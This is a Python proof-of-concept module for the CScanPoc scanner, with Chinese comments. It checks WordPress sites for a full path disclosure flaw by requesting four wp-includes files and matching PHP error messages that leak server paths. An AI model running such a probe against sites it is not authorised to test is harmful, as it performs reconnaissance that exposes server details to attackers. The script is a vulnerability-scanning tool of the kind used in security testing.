# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0124'  # 平台漏洞编号，留空
    name = 'WordPress full Path Disclosure Vulnerability'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-11-01'  # 漏洞公布时间
    desc = '''
    WordPress full Path Disclosure Vulnerability.
    '''  # 漏洞描述
    ref = 'https://www.yascanner.com/#!/n/53'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '169afdf1-fba5-4bc3-9fc9-505d67f6f3bc'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_list = ['/wp-includes/registration-functions.php',
                         '/wp-includes/registration.php',
                         '/wp-includes/user.php',
                         '/wp-includes/rss-functions.php', ]
            file_path = []
            for filename in file_list:
                verify_url = self.target + filename
                try:
                    req = urllib2.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                m = re.search(
                    '</b>:[^\\r\\n]+ in <b>([^<]+)</b> on line <b>(\\d+)</b>', content)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    file_path.append(verify_url)

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
